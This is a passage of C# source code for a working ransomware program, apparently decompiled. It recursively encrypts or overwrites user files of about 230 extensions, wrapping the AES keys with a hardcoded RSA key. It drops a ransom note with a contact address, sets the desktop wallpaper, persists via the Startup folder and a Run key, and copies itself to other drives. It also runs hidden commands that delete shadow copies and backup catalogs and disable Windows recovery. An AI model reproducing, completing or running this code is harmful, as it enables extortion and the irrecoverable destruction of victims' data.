rL/Ypg+l8z3V36X/rfVvVmOEY/V/9JCd+ngfbxfxMxG950Hz+tRGV0rm9eHPuntdKwEA0kN+Kjz6jXDxD/8E9alwFp7pOO9hCjXMzpB+se1G6nzb30U4IX2/qXT9lT+izqUXmGER39eIX2IJp37+dMLZ4JmPvwJ75plnyhAAIBVCVRLK81uQwocptPDqfl2put57eMfy5bRj4WQqXuJcXibC2eB4CUoCgPQJVUkoE0yqnt0QNsJF5XTly7eab/msWEFUt5B6LVgfje/7u3tp3PRhIiziDWpfmSbe3krpfAbW8PH79tHcjh1TCjc2UBIApE/o5iYAGgsoCQDSB58KB3kLFAQA6QMlAQAAQAuUBAAAAC1QEgAAALRASQAAANACJQEAAEALlAQAAAAtUBIAAAC0ROSf0ck/pIv+AAAAAFhJAAAA0AMlAQAAQAuUBAAAAC1QEgAAALRASQAAANACJQEAAEBL5BC5I+h+NZ0+5RH6ycknyAMAAAAKmUjp6MnUTAYUbYt/K/cAAAAUMpEW3YbQSb2PlEGTQ9v8V+4BAAAoZCLfGOuI7/QaKYOSzz+QOwAAAAqZyOf87+Gdqa0ISvZ/KXcAAAAUMo5vN331xVa5BwAAoJDBK7AAAAC0RDrwv7t20H9EEAAAAIgRaWH886+NfzVDAAAAgIXI/o9X0dtrt8sgAAAAECOybNEdtF8GqOGgsTUY/8P1EAAAAKImbQ7raGgE83/GUBHit++c++ijP1eIfQAAAIUJ3m4CAACgBUoCAACAFigJAAAAWqAkAAAAaIGSAAAAoAVKAgAAgBYoCQAAAFqgJAAAAGiBkgAAAKAFSgIAAIAWKAkAAABaoCQAAABogZIAAACgBUoCAACAFigJAAAAWgwlYXUwFHUqAQAAALDToQ6mSjjxfLpmZA9qcfAg7d+/n547rAhOhwAAoMCR5qZhdNmYH9Cul6+iKyuuoauved08DAAAoKARSuKkCT+mLnv/SbUrxDGD5+UvAACAQkYoia7tWxLt2UHrxSEAAADABG83AQAA0CKUxMe79xG160wniEMAAACAiVASby94g7a2/gGVDBPHDIrlLwAAgEIGr8ACAADQElMS4t8G9UN9b70PSgIAAAocPLgGAACgBUoCAACAFigJAAAAWqAkAAAAaIGSAAAAoAVKAgAAgBYoCQAAAFpMJWH+pYT6MYjtAQAAKFywkgAAAKAFSgIAAIAWKAkAAABaokqi9/l/pFkV5+Fz4QAAAKKYH/iLPrhWOw3U99b78YE/AAAocCJXzLmeLjo5fiVx/K+uMGMBAAAUNJFj9m6hN9+SIQAAAMBC5Osta2mtDAAAAABWIlvWQUUAAABwJvIGTE0AAAA0RN6WOwAAAEA8RP8fLWwWTyLpfOcAAAAASUVORK5CYII=";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_me.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[4] { "hello,", "all your files have been encrypted and you cant decrypt this without the speacial file", "contact: maxfromhim@gmail.com", "" };

	private static string[] validExtensions = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".jfif"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>tiubfpu6kkYi5vxbT2NbsZApE72G0SZuYPQacGAUYUmBq/Oneqit//92iUelGQLJdWy+/TlhJ6w/G+sG9D+DozcbrJwOCtdcP4Mk3/7gPMwmybf6hp4H4C1HtSD65qSBK6MRD6qpralFnJs/NJ+6o+CWEbCMiY5J723z67hnpv0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
